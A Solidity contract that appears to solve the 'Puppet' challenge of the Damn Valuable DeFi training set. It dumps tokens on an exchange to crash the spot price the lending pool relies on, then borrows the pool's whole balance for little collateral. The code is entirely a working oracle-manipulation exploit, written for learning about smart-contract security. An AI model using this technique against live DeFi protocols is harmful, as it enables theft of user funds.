// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";
import "./PuppetPool.sol";

interface IExchange {
    function tokenToEthSwapInput(
        uint256 tokens_sold,
        uint256 min_eth,
        uint256 deadline
    ) external returns (uint256 out);
}

contract PuppetPoolExp {
    PuppetPool pool;
    IExchange exchange;

    receive() external payable {}

    constructor(PuppetPool _pool, IExchange _exchange) {
        pool = _pool;
        exchange = _exchange;
    }

    function exp(
        uint256 amount,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) public payable {
        DamnValuableToken token = pool.token();
        token.permit(msg.sender, address(this), amount, deadline, v, r, s);
        token.transferFrom(msg.sender, address(this), amount);
        token.approve(address(exchange), amount);
        exchange.tokenToEthSwapInput(amount, 1, deadline);
        uint256 poolBalance = token.balanceOf(address(pool));
        pool.borrow{value: address(this).balance}(
            poolBalance,
            msg.sender
        );
    }
}
